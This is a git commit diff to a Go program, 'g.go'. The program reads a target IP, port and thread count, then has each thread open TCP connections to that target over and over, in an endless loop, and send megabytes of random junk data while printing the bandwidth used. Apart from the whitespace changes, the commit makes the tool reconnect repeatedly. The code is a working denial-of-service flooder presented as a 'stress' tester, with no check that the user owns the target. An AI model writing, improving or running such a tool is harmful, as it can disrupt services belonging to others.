a6b3659fabc24912b838b78c408ee416378c2e09
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2024-03-21 17:14:59 +0600

    Update g.go

--- g.go
+++ g.go
@@ -1,106 +1,107 @@
 package main
 
 import (
-  "bufio"
-  "fmt"
-  "log"
-  "math/rand"
-  "net"
-  "os"
-  "strconv"
-  "sync"
-  "time"
+    "bufio"
+    "fmt"
+    "log"
+    "net"
+    "os"
+    "strconv"
+    "sync"
+    "time"
+    "math/rand"
 )
 
 var totalDataSent int64 = 0
 var debug = false // Set this to true if you want to see error messages
 
 func generateMalformedData() []byte {
-  // Generate random data with sizes between 1MB and 10MB
-  size := rand.Intn(10*1024*1024-1*1024*1024+1) + 1*1024*1024
-  randomData := make([]byte, size)
-  rand.Read(randomData)
+    // Generate random data with sizes between 1MB and 10MB
+    size := rand.Intn(10*1024*1024-1*1024*1024+1) + 1*1024*1024
+    randomData := make([]byte, size)
+    rand.Read(randomData)
 
-  // Introduce intentional errors in the data
-  for i := 0; i < size*9/10; i++ { // Introduce errors in 40% of the data
-    randomIndex := rand.Intn(len(randomData))
-    randomData[randomIndex] = byte(rand.Intn(256)) // Modify a byte to introduce error
-  }
-
-  return randomData
-}
-
-
-
-func stressServer(address string, wg *sync.WaitGroup, maxConnections int) {
-  defer wg.Done()
-
-  conn, err := net.Dial("tcp", address)
-  if err != nil {
-    log.Fatal(err)
-  }
-  defer conn.Close()
-
-  for {
-    malformedData := generateMalformedData()
-
-    _, err := conn.Write(malformedData)
-    if err != nil && debug {
-      log.Println("Error writing to connection:", err)
+    // Introduce intentional errors in the data
+    for i := 0; i < size*9/10; i++ { // Introduce errors in 40% of the data
+        randomIndex := rand.Intn(len(randomData))
+        randomData[randomIndex] = byte(rand.Intn(256)) // Modify a byte to introduce error
     }
 
-    totalDataSent += int64(len(malformedData))
+    return randomData
+}
 
-  }
+func stressServer(address string, wg *sync.WaitGroup) {
+    defer wg.Done()
+
+    for {
+        conn, err := net.Dial("tcp", address)
+        if err != nil {
+            if debug {
+                log.Println("Error connecting:", err)
+            }
+            continue // Continue to the next iteration to retry connecting
+        }
+
+        data := generateMalformedData()
+
+        n, err := conn.Write(data)
+        if err != nil && debug {
+            log.Println("Error writing to connection:", err)
+        }
+
+        totalDataSent += int64(n)
+
+        conn.Close()
+    }
 }
 
 func printBandwidth() {
-  ticker := time.NewTicker(1 * time.Second)
-  defer ticker.Stop()
+    ticker := time.NewTicker(1 * time.Second)
+    defer ticker.Stop()
 
-  for range ticker.C {
-    switch {
-    case totalDataSent > 1<<30:
-      fmt.Printf("\rTotal data sent: %.2f GB", float64(totalDataSent)/(1<<30))
-    case totalDataSent > 1<<20:
-      fmt.Printf("\rTotal data sent: %.2f MB", float64(totalDataSent)/(1<<20))
-    case totalDataSent > 1<<10:
-      fmt.Printf("\rTotal data sent: %.2f KB", float64(totalDataSent)/(1<<10))
-    default:
-      fmt.Printf("\rTotal data sent: %d bytes", totalDataSent)
+    for range ticker.C {
+        switch {
+        case totalDataSent > 1<<30:
+            fmt.Printf("\rTotal data sent: %.2f GB", float64(totalDataSent)/(1<<30))
+        case totalDataSent > 1<<20:
+            fmt.Printf("\rTotal data sent: %.2f MB", float64(totalDataSent)/(1<<20))
+        case totalDataSent > 1<<10:
+            fmt.Printf("\rTotal data sent: %.2f KB", float64(totalDataSent)/(1<<10))
+        default:
+            fmt.Printf("\rTotal data sent: %d bytes", totalDataSent)
+        }
+        totalDataSent = 0
     }
-    totalDataSent = 0
-  }
 }
 
 func main() {
-  reader := bufio.NewReader(os.Stdin)
+    reader := bufio.NewReader(os.Stdin)
 
-  fmt.Print("Enter IP: ")
-  ip, _ := reader.ReadString('\n')
-  ip = ip[:len(ip)-1] // Remove newline character
+    fmt.Print("Enter IP: ")
+    ip, _ := reader.ReadString('\n')
+    ip = ip[:len(ip)-1] // Remove newline character
 
-  fmt.Print("Enter port: ")
-  port, _ := reader.ReadString('\n')
-  port = port[:len(port)-1] // Remove newline character
+    fmt.Print("Enter port: ")
+    port, _ := reader.ReadString('\n')
+    port = port[:len(port)-1] // Remove newline character
 
-  fmt.Print("Enter amount of threads: ")
-  threadsStr, _ := reader.ReadString('\n')
-  threadsStr = threadsStr[:len(threadsStr)-1] // Remove newline character
-  threads, err := strconv.Atoi(threadsStr)
-  if err != nil {
-    log.Fatal(err)
-  }
+    fmt.Print("Enter amount of threads: ")
+    threadsStr, _ := reader.ReadString('\n')
+    threadsStr = threadsStr[:len(threadsStr)-1] // Remove newline character
+    threads, err := strconv.Atoi(threadsStr)
+    if err != nil {
+        log.Fatal(err)
+    }
 
-  address := ip + ":" + port
+    address := ip + ":" + port
 
-  var wg sync.WaitGroup
-  for i := 0; i < threads; i++ {
-    wg.Add(1)
-    go stressServer(address, &wg, 10) // 10 connections per thread
-  }
+    var wg sync.WaitGroup
+    for i := 0; i < threads; i++ {
+        wg.Add(1)
+        go stressServer(address, &wg) // Start a new goroutine
+    }
 
-  go printBandwidth()
+    go printBandwidth()
 
-  wg.Wait()
+    wg.Wait()
 }
